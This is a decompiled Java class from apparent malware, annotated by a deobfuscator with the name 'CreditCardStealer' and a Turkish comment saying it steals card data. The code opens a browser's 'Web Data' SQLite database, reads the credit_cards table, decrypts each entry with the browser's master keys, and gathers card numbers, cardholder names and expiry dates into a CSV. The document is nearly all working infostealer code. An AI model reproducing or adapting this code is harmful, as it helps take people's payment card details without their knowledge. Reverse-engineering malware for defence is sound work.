/*\n * ========================================\n * DEOBFUSCATED: CreditCardStealer.java\n * Original: c/k.java\n * ----------------------------------------\n * Kredi kartı hırsızı - Web Data SQLite den kart bilgisi çalar\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.f;
import c.j;
import c.k$CreditCard;
import c.r;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public final class k
extends j {
    public static final String CSV_HEADER = "e,Card Number,Name On Card,Expiration Month,Expiration Year\n";
    private final List<k$CreditCard> e = new ArrayList<k$CreditCard>();

    public k(f f2) {
        super(f2, "Web Data" /* r.wd() */, "credit_cards" /* r.cc() */);
        this.findResultSets();
    }

    @Override
    public String toCsvColumn() {
        return super.toCsvColumn(this.e);
    }

    @Override
    public void onResultSetFound(ResultSet resultSet) {
        try {
            this.e.add(new k$CreditCard(resultSet, this.getProfile().getBrowser().getMasterKeys()));
        }
        catch (SQLException sQLException) {
            // empty catch block
        }
    }

    public int getCount() {
        return this.e.size();
    }
}

